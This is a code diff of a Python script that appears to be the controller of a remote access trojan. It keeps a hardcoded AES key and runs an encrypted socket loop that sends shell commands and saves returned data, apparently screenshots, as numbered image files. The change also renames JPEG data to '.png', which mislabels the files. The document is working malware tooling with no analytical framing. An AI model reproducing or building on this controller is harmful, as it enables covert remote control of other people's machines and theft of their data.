@@ -1,16 +1,12 @@
-from socket import socket
 import Crypto.Cipher.AES as aes
 import os
+import utils
+
+from socket import socket
 
 key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
 host = "127.0.0.1"
 port = 1005
-
-def encryption(plaintext:str):
-    cipher = aes.new(key, aes.MODE_EAX)
-    nonce = cipher.nonce
-    cipherText, tag = cipher.encrypt_and_digest(plaintext.encode("utf-8"))
-    return nonce + tag + cipherText
 
 def decryption(cipherText):
     fileCounter = 1
@@ -22,7 +18,7 @@ def decryption(cipherText):
     if(plaintext[:5] == b'\xff\xd8\xff\xe0\x00'):
         for i in os.listdir("."):
             fileCounter = fileCounter + 1
-        newFile = str(fileCounter)+".jpg"
+        newFile = str(fileCounter)+".png"
     elif(plaintext[:5] == "Foreg"):
         for i in os.listdir("."):
             fileCounter = fileCounter + 1
@@ -59,7 +55,7 @@ while True:
         inpt = input("Shell >")
     else:
         inpt = input("Enter command:")
-    conn.sendall(encryption(inpt))
+    conn.sendall(utils.encrypt(inpt.encode("utf-8")))
     recv = decryption(conn.recv(1024))  #Data recieved from the socket. 1024 is the maximum amount of data to be received at once
     if recv:
         recv = str(recv)[2:-1]
